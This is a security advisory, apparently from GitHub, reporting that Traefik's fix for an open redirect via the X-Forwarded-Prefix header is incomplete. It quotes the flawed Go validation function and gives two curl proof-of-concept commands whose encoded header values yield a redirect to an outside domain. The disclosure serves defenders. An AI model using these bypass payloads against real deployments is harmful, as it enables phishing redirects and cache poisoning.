summary: "Traefik's X-Forwarded-Prefix Header still allows for Open Redirect\n### Impact\n\n\
  There is a vulnerability in Traefik that allows the client to provide the `X-Forwarded-Prefix`\
  \ header from an untrusted source.\n\n### Patches\n\n- https://github.com/traefik/traefik/releases/tag/v2.11.14\n\
  - https://github.com/traefik/traefik/releases/tag/v3.2.1\n\n### Workarounds\n\nNo workaround.\n\
  \n### For more information\n\nIf you have any questions or comments about this advisory, please\
  \ [open an issue](https://github.com/traefik/traefik/issues).\n\n<details>\n<summary>Original\
  \ Description</summary>\n### Summary\nThe previously reported open redirect ([GHSA-6qq8-5wq3-86rp](https://github.com/traefik/traefik/security/advisories/GHSA-6qq8-5wq3-86rp))\
  \ is not fixed correctly. The safePrefix function can be tricked to return an absolute URL.\n\
  \n\n\n### Details\nThe Traefik API [dashboard component](https://github.com/traefik/traefik/blob/master/pkg/api/dashboard/dashboard.go)\
  \ tries to validate that the value of the header X-Forwarded-Prefix is a site relative path:\n\
  ```go\nhttp.Redirect(resp, req, safePrefix(req)+\"/dashboard/\", http.StatusFound)\n```\n\n\
  ```go\nfunc safePrefix(req *http.Request) string {\n\tprefix := req.Header.Get(\"X-Forwarded-Prefix\"\
  )\n\tif prefix == \"\" {\n\t\treturn \"\"\n\t}\n\n\tparse, err := url.Parse(prefix)\n\tif\
  \ err != nil {\n\t\treturn \"\"\n\t}\n\n\treturn parse.Path\n}\n```\n\n### PoC\nAn attacker\
  \ can bypass this by sending the following payload:\n\n```bash\ncurl -v 'http://traefik.localhost'\
  \ -H 'X-Forwarded-Prefix: %0d//a.com'\n[...]\n> HTTP/1.1 302 Found\n> Location: //a.com/dashboard/\n\
  ```\n\nor similar:\n\n```bash\ncurl -v 'http://traefik.localhost' -H 'X-Forwarded-Prefix:\
  \ %2f%2fa.com'\n[...]\n> HTTP/1.1 302 Found\n> Location: //a.com/dashboard/\n```\n\n### Impact\n\
  Similar to the previously reported bug. In cache poisoning scenarios this may be exploitable.\n\
  </details>"
